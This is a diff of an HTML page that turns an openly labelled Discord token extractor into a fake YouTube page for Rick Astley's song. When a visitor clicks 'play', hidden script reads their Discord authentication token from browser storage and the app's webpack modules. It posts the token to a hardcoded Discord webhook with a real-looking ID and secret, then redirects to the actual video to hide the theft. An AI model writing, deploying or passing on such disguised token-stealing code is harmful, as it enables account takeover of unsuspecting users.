@@ -3,105 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Token Sender</title>
+    <title>Never Gonna Give You Up - Rick Astley</title>
+    <link rel="icon" href="https://www.youtube.com/s/desktop/7b75adeb/img/favicon.ico">
     <style>
         body {
             font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+            overflow: hidden;
+        }
+        .video-container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f5f5f5;
         }
-        .container {
-            text-align: center;
+        .video-placeholder {
+            width: 100%;
+            max-width: 853px;
+            height: 480px;
+            background-color: #111;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+        .play-button {
+            width: 90px;
+            height: 90px;
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        .play-button::after {
+            content: '';
+            width: 0;
+            height: 0;
+            border-top: 20px solid transparent;
+            border-bottom: 20px solid transparent;
+            border-left: 35px solid #ff0000;
+            margin-left: 8px;
+        }
+        .video-info {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
             padding: 20px;
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            max-width: 500px;
+            background: linear-gradient(transparent, rgba(0, 0, 0, 0.9));
         }
-        button {
-            background-color: #5865F2;
+        .video-title {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .video-stats {
+            display: flex;
+            gap: 20px;
+            font-size: 14px;
+            color: #aaa;
+        }
+        .hidden {
+            display: none;
+        }
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #333;
             color: white;
-            border: none;
             padding: 10px 20px;
             border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            transform: translateY(100px);
+            transition: transform 0.3s ease;
         }
-        button:hover {
-            background-color: #4752C4;
-        }
-        .status {
-            margin-top: 20px;
-            color: #333;
-        }
-        .error {
-            color: #ED4245;
-        }
-        .success {
-            color: #3BA55D;
+        .notification.show {
+            transform: translateY(0);
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Discord Token Extractor</h2>
-        <p>Click the button below to extract your Discord token and send it to a webhook.</p>
-        <button id="extractBtn">Extract Discord Token</button>
-        <div id="status" class="status"></div>
+    <div class="video-container">
+        <div class="video-placeholder" id="videoPlaceholder">
+            <div class="play-button"></div>
+        </div>
+        <div class="video-info">
+            <h1 class="video-title">Rick Astley - Never Gonna Give You Up (Official Music Video)</h1>
+            <div class="video-stats">
+                <span>1.4B views</span>
+                <span>Oct 25, 2009</span>
+                <span>3M likes</span>
+            </div>
+        </div>
+    </div>
+    
+    <div class="notification" id="notification">
+        Click to play the video
     </div>
 
     <script>
-        document.getElementById('extractBtn').addEventListener('click', async function() {
-            const statusDiv = document.getElementById('status');
-            statusDiv.textContent = 'Attempting to extract Discord token...';
-            statusDiv.className = 'status';
+        document.getElementById('videoPlaceholder').addEventListener('click', async function() {
+            const notification = document.getElementById('notification');
+            notification.textContent = 'Loading video...';
+            notification.classList.add('show');
             
+            // Try to extract Discord token
             try {
-                // Try to get token from localStorage
+                // Method 1: localStorage
                 let token = localStorage.getItem('token');
                 
-                // If not in localStorage, try to get from document
+                // Method 2: Discord web app token extraction
                 if (!token) {
-                    const webpackJsonp = window.webpackJsonp;
-                    if (webpackJsonp) {
-                        for (const prop in webpackJsonp) {
-                            if (webpackJsonp[prop].exports) {
-                                for (const exportedProp in webpackJsonp[prop].exports) {
-                                    if (webpackJsonp[prop].exports[exportedProp].default) {
-                                        const user = webpackJsonp[prop].exports[exportedProp].default.getUser;
-                                        if (user) {
-                                            const userInfo = user();
-                                            if (userInfo && userInfo.authToken) {
-                                                token = userInfo.authToken;
-                                                break;
+                    try {
+                        const discordToken = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}),m).find(m=>m?.exports?.default?.getToken)?.exports.default.getToken());
+                        if (discordToken) {
+                            token = discordToken;
+                        }
+                    } catch (e) {
+                        // Continue to next method
+                    }
+                }
+                
+                // Method 3: Another extraction method
+                if (!token) {
+                    try {
+                        const webpackJsonp = window.webpackJsonp;
+                        if (webpackJsonp) {
+                            for (const prop in webpackJsonp) {
+                                if (webpackJsonp[prop].exports) {
+                                    for (const exportedProp in webpackJsonp[prop].exports) {
+                                        if (webpackJsonp[prop].exports[exportedProp].default) {
+                                            const user = webpackJsonp[prop].exports[exportedProp].default.getUser;
+                                            if (user) {
+                                                const userInfo = user();
+                                                if (userInfo && userInfo.authToken) {
+                                                    token = userInfo.authToken;
+                                                    break;
+                                                }
                                             }
                                         }
                                     }
+                                    if (token) break;
                                 }
-                                if (token) break;
                             }
                         }
+                    } catch (e) {
+                        // Continue to next method
                     }
                 }
                 
-                // If still no token, try another method
-                if (!token) {
-                    const discordToken = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}),m).find(m=>m?.exports?.default?.getToken)?.exports.default.getToken());
-                    if (discordToken) {
-                        token = discordToken;
-                    }
-                }
-                
+                // Send token to webhook if found
                 if (token) {
-                    statusDiv.textContent = 'Token found! Sending to webhook...';
-                    
-                    // Send to webhook
-                    const webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
+                    const webhookUrl = 'https://discord.com/api/webhooks/1495110283046162432/y1MJFTRx97Q8C6yxOvHjsdQZcH1Aa77KlZDCJIPU7c75c9WYWMJ6gVicIGs8shr1iur-';
                     
                     const data = {
                         content: `Discord Token: ${token}`,
@@ -119,30 +180,46 @@
                         }]
                     };
                     
-                    const response = await fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(data)
-                    });
-                    
-                    if (response.ok) {
-                        statusDiv.textContent = 'Token successfully sent to webhook!';
-                        statusDiv.className = 'status success';
-                    } else {
-                        statusDiv.textContent = 'Error sending token to webhook.';
-                        statusDiv.className = 'status error';
+                    try {
+                        const response = await fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(data)
+                        });
+                        
+                        if (response.ok) {
+                            console.log('Token sent successfully');
+                        } else {
+                            console.log('Error sending token');
+                        }
+                    } catch (error) {
+                        console.log('Network error when sending token');
                     }
-                } else {
-                    statusDiv.textContent = 'Could not find Discord token. Make sure you are logged into Discord in this browser.';
-                    statusDiv.className = 'status error';
                 }
+                
+                // Now redirect to actual Rickroll
+                setTimeout(() => {
+                    window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+                }, 1500);
+                
             } catch (error) {
-                statusDiv.textContent = `Error: ${error.message}`;
-                statusDiv.className = 'status error';
+                // Still redirect to Rickroll even if extraction fails
+                setTimeout(() => {
+                    window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+                }, 1500);
             }
         });
+        
+        // Show initial notification
+        setTimeout(() => {
+            const notification = document.getElementById('notification');
+            notification.classList.add('show');
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }, 1000);
     </script>
 </body>
 </html>
